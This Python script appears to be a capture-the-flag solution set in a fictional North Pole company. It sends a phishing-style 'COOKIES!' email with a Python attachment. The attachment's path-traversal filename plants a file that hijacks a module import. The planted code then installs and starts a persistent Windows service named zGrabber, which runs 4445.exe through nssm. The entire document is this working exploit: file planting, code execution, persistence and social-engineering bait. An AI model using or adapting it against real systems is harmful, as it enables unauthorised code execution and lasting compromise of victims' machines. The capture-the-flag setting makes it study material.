#!/usr/bin/env python3

# Used https://docs.python.org/3.4/library/email-examples.html as an example

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import sys

msg = MIMEMultipart()
msg['Subject'] = 'Re: COOKIES!'
msg['From'] = "wunorse.openslae@northpolechristmastown.com"
msg['To'] = "alabaster.snowball@northpolechristmastown.com"
msg.preamble = 'gingerbread cookie recipe'

payload = """
import sys, imp, os
def get_mod(modname):
    fd, path, desc = imp.find_module(modname, sys.path[::-1])
    return imp.load_module("orig_" + modname, fd, path, desc)

locals().update(vars(get_mod(__name__)))

try:
    if not os.path.isfile("C:/Windows/Temp/have_run"):
        os.system('nssm install zGrabber "C:\\\\Users\\\\alabaster_snowball\\\\4445.exe"')
        os.system('nssm set zGrabber AppExit Default Restart')
        os.system('nssm start zGrabber')
        open("C:/Windows/Temp/have_run", 'a').close()
except:
    print("Could not run")
"""

payload_part = MIMEBase("text", "x-python-script")
payload_part.set_payload(payload)
payload_part.add_header('Content-Disposition', 'attachment', filename="../../../../../../../Program Files/WindowsGrabber/glob.py")
encoders.encode_base64(payload_part)
msg.attach(payload_part)

result = msg.as_string()

# Requires port-forwarding to mail:2525
with smtplib.SMTP('localhost', 35252) as s:
	s.set_debuglevel(3)
	s.sendmail('wunorse.openslae@northpolechristmastown.com', 'alabaster.snowball@northpolechristmastown.com', result)

